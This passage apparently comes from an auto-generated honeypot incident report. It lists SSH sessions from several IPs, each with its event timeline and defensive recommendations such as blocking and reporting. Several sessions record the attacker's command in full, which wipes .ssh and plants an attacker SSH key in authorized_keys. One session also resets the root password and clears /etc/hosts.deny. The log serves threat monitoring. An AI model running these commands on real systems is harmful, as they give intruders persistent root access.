| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 18:20:04` | `cowrie.session.connect` |
| `2026-06-09 18:20:04` | `cowrie.client.version` |
| `2026-06-09 18:20:04` | `cowrie.client.kex` |
| `2026-06-09 18:20:04` | `cowrie.login.success` |
| `2026-06-09 18:20:05` | `cowrie.session.params` |
| `2026-06-09 18:20:05` | `cowrie.command.input` |
| `2026-06-09 18:20:05` | `cowrie.command.failed` |
| `2026-06-09 18:20:05` | `cowrie.log.closed` |
| `2026-06-09 18:20:05` | `cowrie.session.params` |
| `2026-06-09 18:20:05` | `cowrie.command.input` |
| `2026-06-09 18:20:05` | `cowrie.session.file_download` |
| `2026-06-09 18:20:05` | `cowrie.log.closed` |
| `2026-06-09 18:20:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `148.66.132[.]204` to AbuseIPDB if not already reported
- [ ] Block `148.66.132[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0485fca59209

| Field | Detail |
|---|---|
| **Source IP** | `148.66.132[.]204` |
| **First Seen** | 2026-06-09 18:20 |
| **Last Seen** | 2026-06-09 18:20 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 18:20:06` | `cowrie.session.connect` |
| `2026-06-09 18:20:06` | `cowrie.client.version` |
| `2026-06-09 18:20:07` | `cowrie.client.kex` |
| `2026-06-09 18:20:07` | `cowrie.login.success` |
| `2026-06-09 18:20:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `148.66.132[.]204` to AbuseIPDB if not already reported
- [ ] Block `148.66.132[.]204` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f56c5735879e

| Field | Detail |
|---|---|
| **Source IP** | `20.12.41[.]6` |
| **First Seen** | 2026-06-09 18:50 |
| **Last Seen** | 2026-06-09 18:50 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 18:50:41` | `cowrie.session.connect` |
| `2026-06-09 18:50:41` | `cowrie.client.version` |
| `2026-06-09 18:50:41` | `cowrie.client.kex` |
| `2026-06-09 18:50:42` | `cowrie.login.success` |
| `2026-06-09 18:50:42` | `cowrie.session.params` |
| `2026-06-09 18:50:42` | `cowrie.command.input` |
| `2026-06-09 18:50:42` | `cowrie.command.failed` |
| `2026-06-09 18:50:43` | `cowrie.log.closed` |
| `2026-06-09 18:50:43` | `cowrie.session.params` |
| `2026-06-09 18:50:43` | `cowrie.command.input` |
| `2026-06-09 18:50:43` | `cowrie.session.file_download` |
| `2026-06-09 18:50:43` | `cowrie.log.closed` |
| `2026-06-09 18:50:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.12.41[.]6` to AbuseIPDB if not already reported
- [ ] Block `20.12.41[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d969c5700fa2

| Field | Detail |
|---|---|
| **Source IP** | `20.12.41[.]6` |
| **First Seen** | 2026-06-09 18:50 |
| **Last Seen** | 2026-06-09 18:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 18:50:46` | `cowrie.session.connect` |
| `2026-06-09 18:50:46` | `cowrie.client.version` |
| `2026-06-09 18:50:46` | `cowrie.client.kex` |
| `2026-06-09 18:50:47` | `cowrie.login.success` |
| `2026-06-09 18:50:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.12.41[.]6` to AbuseIPDB if not already reported
- [ ] Block `20.12.41[.]6` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9234b7797fb7

| Field | Detail |
|---|---|
| **Source IP** | `20.12.41[.]6` |
| **First Seen** | 2026-06-09 18:56 |
| **Last Seen** | 2026-06-09 18:56 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 18:56:52` | `cowrie.session.connect` |
| `2026-06-09 18:56:52` | `cowrie.client.version` |
| `2026-06-09 18:56:52` | `cowrie.client.kex` |
| `2026-06-09 18:56:53` | `cowrie.login.success` |
| `2026-06-09 18:56:54` | `cowrie.session.params` |
| `2026-06-09 18:56:54` | `cowrie.command.input` |
| `2026-06-09 18:56:54` | `cowrie.command.failed` |
| `2026-06-09 18:56:54` | `cowrie.log.closed` |
| `2026-06-09 18:56:54` | `cowrie.session.params` |
| `2026-06-09 18:56:54` | `cowrie.command.input` |
| `2026-06-09 18:56:55` | `cowrie.session.file_download` |
| `2026-06-09 18:56:55` | `cowrie.log.closed` |
| `2026-06-09 18:56:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.12.41[.]6` to AbuseIPDB if not already reported
- [ ] Block `20.12.41[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cdbfc14345da

| Field | Detail |
|---|---|
| **Source IP** | `20.12.41[.]6` |
| **First Seen** | 2026-06-09 18:56 |
| **Last Seen** | 2026-06-09 18:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 18:56:57` | `cowrie.session.connect` |
| `2026-06-09 18:56:57` | `cowrie.client.version` |
| `2026-06-09 18:56:57` | `cowrie.client.kex` |
| `2026-06-09 18:56:58` | `cowrie.login.success` |
| `2026-06-09 18:56:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.12.41[.]6` to AbuseIPDB if not already reported
- [ ] Block `20.12.41[.]6` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b9299870ab4a

| Field | Detail |
|---|---|
| **Source IP** | `20.12.41[.]6` |
| **First Seen** | 2026-06-09 19:06 |
| **Last Seen** | 2026-06-09 19:07 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 19:06:58` | `cowrie.session.connect` |
| `2026-06-09 19:06:58` | `cowrie.client.version` |
| `2026-06-09 19:06:58` | `cowrie.client.kex` |
| `2026-06-09 19:06:59` | `cowrie.login.success` |
| `2026-06-09 19:06:59` | `cowrie.session.params` |
| `2026-06-09 19:06:59` | `cowrie.command.input` |
| `2026-06-09 19:06:59` | `cowrie.command.failed` |
| `2026-06-09 19:07:00` | `cowrie.log.closed` |
| `2026-06-09 19:07:00` | `cowrie.session.params` |
| `2026-06-09 19:07:00` | `cowrie.command.input` |
| `2026-06-09 19:07:00` | `cowrie.session.file_download` |
| `2026-06-09 19:07:00` | `cowrie.log.closed` |
| `2026-06-09 19:07:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.12.41[.]6` to AbuseIPDB if not already reported
- [ ] Block `20.12.41[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bc54e5a9c7bd

| Field | Detail |
|---|---|
| **Source IP** | `20.12.41[.]6` |
| **First Seen** | 2026-06-09 19:07 |
| **Last Seen** | 2026-06-09 19:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 19:07:03` | `cowrie.session.connect` |
| `2026-06-09 19:07:03` | `cowrie.client.version` |
| `2026-06-09 19:07:03` | `cowrie.client.kex` |
| `2026-06-09 19:07:04` | `cowrie.login.success` |
| `2026-06-09 19:07:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.12.41[.]6` to AbuseIPDB if not already reported
- [ ] Block `20.12.41[.]6` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f4468329a2c7

| Field | Detail |
|---|---|
| **Source IP** | `138.124.99[.]219` |
| **First Seen** | 2026-06-09 19:13 |
| **Last Seen** | 2026-06-09 19:14 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 19:13:57` | `cowrie.session.connect` |
| `2026-06-09 19:13:57` | `cowrie.client.version` |
| `2026-06-09 19:13:57` | `cowrie.client.kex` |
| `2026-06-09 19:13:57` | `cowrie.login.success` |
| `2026-06-09 19:13:58` | `cowrie.session.params` |
| `2026-06-09 19:13:58` | `cowrie.command.input` |
| `2026-06-09 19:13:58` | `cowrie.command.failed` |
| `2026-06-09 19:13:58` | `cowrie.log.closed` |
| `2026-06-09 19:13:58` | `cowrie.session.params` |
| `2026-06-09 19:13:58` | `cowrie.command.input` |
| `2026-06-09 19:13:59` | `cowrie.session.file_download` |
| `2026-06-09 19:13:59` | `cowrie.log.closed` |
| `2026-06-09 19:14:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.124.99[.]219` to AbuseIPDB if not already reported
- [ ] Block `138.124.99[.]219` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8020bdaf24da

| Field | Detail |
|---|---|
| **Source IP** | `138.124.99[.]219` |
| **First Seen** | 2026-06-09 19:14 |
| **Last Seen** | 2026-06-09 19:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 19:14:03` | `cowrie.session.connect` |
| `2026-06-09 19:14:03` | `cowrie.client.version` |
| `2026-06-09 19:14:03` | `cowrie.client.kex` |
| `2026-06-09 19:14:04` | `cowrie.login.success` |
| `2026-06-09 19:14:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.124.99[.]219` to AbuseIPDB if not already reported
- [ ] Block `138.124.99[.]219` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-21bb41945824

| Field | Detail |
|---|---|
| **Source IP** | `138.124.99[.]219` |
| **First Seen** | 2026-06-09 19:27 |
| **Last Seen** | 2026-06-09 19:28 |
| **Session Duration** | 22s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:UNOiZo1pYZwN"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 19:27:47` | `cowrie.session.connect` |
| `2026-06-09 19:27:47` | `cowrie.client.version` |
| `2026-06-09 19:27:47` | `cowrie.client.kex` |
| `2026-06-09 19:27:48` | `cowrie.login.success` |
| `2026-06-09 19:27:48` | `cowrie.session.params` |
| `2026-06-09 19:27:48` | `cowrie.command.input` |
| `2026-06-09 19:27:48` | `cowrie.command.failed` |
| `2026-06-09 19:27:48` | `cowrie.log.closed` |
| `2026-06-09 19:27:49` | `cowrie.session.params` |
| `2026-06-09 19:27:49` | `cowrie.command.input` |
| `2026-06-09 19:27:49` | `cowrie.session.file_download` |
| `2026-06-09 19:27:49` | `cowrie.log.closed` |
| `2026-06-09 19:28:01` | `cowrie.session.params` |
| `2026-06-09 19:28:01` | `cowrie.command.input` |
| `2026-06-09 19:28:01` | `cowrie.log.closed` |
| `2026-06-09 19:28:02` | `cowrie.session.params` |
| `2026-06-09 19:28:02` | `cowrie.command.input` |
| `2026-06-09 19:28:02` | `cowrie.log.closed` |
| `2026-06-09 19:28:02` | `cowrie.session.params` |
| `2026-06-09 19:28:02` | `cowrie.command.input` |
| `2026-06-09 19:28:02` | `cowrie.session.file_download` |
| `2026-06-09 19:28:02` | `cowrie.log.closed` |
| `2026-06-09 19:28:03` | `cowrie.session.params` |
| `2026-06-09 19:28:03` | `cowrie.command.input` |
| `2026-06-09 19:28:03` | `cowrie.log.closed` |
| `2026-06-09 19:28:03` | `cowrie.session.params` |
| `2026-06-09 19:28:03` | `cowrie.command.input` |
| `2026-06-09 19:28:04` | `cowrie.log.closed` |
| `2026-06-09 19:28:04` | `cowrie.session.params` |
| `2026-06-09 19:28:04` | `cowrie.command.input` |
| `2026-06-09 19:28:04` | `cowrie.command.input` |
| `2026-06-09 19:28:04` | `cowrie.log.closed` |
| `2026-06-09 19:28:04` | `cowrie.session.params` |
| `2026-06-09 19:28:04` | `cowrie.command.input` |
| `2026-06-09 19:28:05` | `cowrie.log.closed` |
| `2026-06-09 19:28:05` | `cowrie.session.params` |
| `2026-06-09 19:28:05` | `cowrie.command.input` |
| `2026-06-09 19:28:05` | `cowrie.log.closed` |
| `2026-06-09 19:28:05` | `cowrie.session.params` |
| `2026-06-09 19:28:05` | `cowrie.command.input` |
| `2026-06-09 19:28:06` | `cowrie.log.closed` |
| `2026-06-09 19:28:06` | `cowrie.session.params` |
| `2026-06-09 19:28:06` | `cowrie.command.input` |
| `2026-06-09 19:28:06` | `cowrie.log.closed` |
| `2026-06-09 19:28:06` | `cowrie.session.params` |
| `2026-06-09 19:28:06` | `cowrie.command.input` |
| `2026-06-09 19:28:07` | `cowrie.log.closed` |
| `2026-06-09 19:28:07` | `cowrie.session.params` |
| `2026-06-09 19:28:07` | `cowrie.command.input` |
| `2026-06-09 19:28:07` | `cowrie.log.closed` |
| `2026-06-09 19:28:08` | `cowrie.session.params` |
| `2026-06-09 19:28:08` | `cowrie.command.input` |
| `2026-06-09 19:28:08` | `cowrie.log.closed` |
| `2026-06-09 19:28:08` | `cowrie.session.params` |
| `2026-06-09 19:28:08` | `cowrie.command.input` |
| `2026-06-09 19:28:08` | `cowrie.log.closed` |
| `2026-06-09 19:28:09` | `cowrie.session.params` |
| `2026-06-09 19:28:09` | `cowrie.command.input` |
| `2026-06-09 19:28:09` | `cowrie.log.closed` |
| `2026-06-09 19:28:09` | `cowrie.session.params` |
| `2026-06-09 19:28:09` | `cowrie.command.input` |
| `2026-06-09 19:28:09` | `cowrie.log.closed` |
| `2026-06-09 19:28:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.124.99[.]219` to AbuseIPDB if not already reported
- [ ] Block `138.124.99[.]219` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d7bc8617e90e

| Field | Detail |
|---|---|
| **Source IP** | `138.124.99[.]219` |
| **First Seen** | 2026-06-09 19:32 |
| **Last Seen** | 2026-06-09 19:32 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 19:32:21` | `cowrie.session.connect` |
| `2026-06-09 19:32:21` | `cowrie.client.version` |
| `2026-06-09 19:32:21` | `cowrie.client.kex` |
| `2026-06-09 19:32:22` | `cowrie.login.success` |
| `2026-06-09 19:32:22` | `cowrie.session.params` |
| `2026-06-09 19:32:22` | `cowrie.command.input` |
| `2026-06-09 19:32:22` | `cowrie.command.failed` |
| `2026-06-09 19:32:22` | `cowrie.log.closed` |
| `2026-06-09 19:32:22` | `cowrie.session.params` |
| `2026-06-09 19:32:22` | `cowrie.command.input` |
| `2026-06-09 19:32:23` | `cowrie.session.file_download` |
| `2026-06-09 19:32:23` | `cowrie.log.closed` |
| `2026-06-09 19:32:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.124.99[.]219` to AbuseIPDB if not already reported
- [ ] Block `138.124.99[.]219` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1cad83f0d9b6

| Field | Detail |
|---|---|
| **Source IP** | `201.63.223[.]140` |
| **First Seen** | 2026-06-09 19:32 |
| **Last Seen** | 2026-06-09 19:32 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 19:32:25` | `cowrie.session.connect` |
| `2026-06-09 19:32:25` | `cowrie.client.version` |
| `2026-06-09 19:32:25` | `cowrie.client.kex` |
| `2026-06-09 19:32:26` | `cowrie.login.success` |
| `2026-06-09 19:32:27` | `cowrie.session.params` |
| `2026-06-09 19:32:27` | `cowrie.command.input` |
| `2026-06-09 19:32:27` | `cowrie.command.failed` |
| `2026-06-09 19:32:28` | `cowrie.log.closed` |
| `2026-06-09 19:32:28` | `cowrie.session.params` |
| `2026-06-09 19:32:28` | `cowrie.command.input` |
| `2026-06-09 19:32:29` | `cowrie.session.file_download` |
| `2026-06-09 19:32:29` | `cowrie.log.closed` |
| `2026-06-09 19:32:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.63.223[.]140` to AbuseIPDB if not already reported
- [ ] Block `201.63.223[.]140` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7b876bcced9c

| Field | Detail |
|---|---|
| **Source IP** | `138.124.99[.]219` |
| **First Seen** | 2026-06-09 19:32 |
| **Last Seen** | 2026-06-09 19:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 19:32:30` | `cowrie.session.connect` |
| `2026-06-09 19:32:30` | `cowrie.client.version` |
| `2026-06-09 19:32:30` | `cowrie.client.kex` |
| `2026-06-09 19:32:31` | `cowrie.login.success` |
| `2026-06-09 19:32:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.124.99[.]219` to AbuseIPDB if not already reported
- [ ] Block `138.124.99[.]219` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bbc9801113bf

| Field | Detail |
|---|---|
| **Source IP** | `201.63.223[.]140` |
| **First Seen** | 2026-06-09 19:32 |
| **Last Seen** | 2026-06-09 19:32 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
